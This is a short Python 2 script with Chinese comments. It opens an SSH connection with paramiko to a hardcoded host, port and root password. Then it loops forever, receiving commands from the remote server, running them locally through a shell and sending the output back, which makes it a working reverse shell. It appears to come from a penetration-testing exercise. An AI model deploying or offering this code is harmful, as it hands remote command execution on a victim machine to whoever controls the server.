#-*- coding:utf8 -*-

import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command, port = 22):
    client = paramiko.SSHClient()
    # client.load_host_keys('/home/root/.ssh/known_hosts') #支持用密钥认证代替密码验证,实际环境推荐使用密钥认证
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())    #设置自动添加和保存目标ssh服务器的ssh密钥
    client.connect(ip, port, username=user, password=passwd)  #连接
    ssh_session = client.get_transport().open_session() #打开会话
    if ssh_session.active:
        ssh_session.send(command)
       # ssh_session.exec_command(command)   #执行命令,这个是linux的命令，并且完整的ssh服务器才会响应命令
        print ssh_session.recv(1024)    #返回命令执行结果(1024个字符)
        while True:
            command = ssh_session.recv(1024)    #从ssh服务器获取命令
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(str(cmd_output))
            except Exception, e:
                ssh_session.send(str(e))
        client.close()
    return
paramiko.util.log_to_file("filename.log")
ssh_command('127.0.0.1', 'root', 'lovepython', 'ipconfig', 6888)
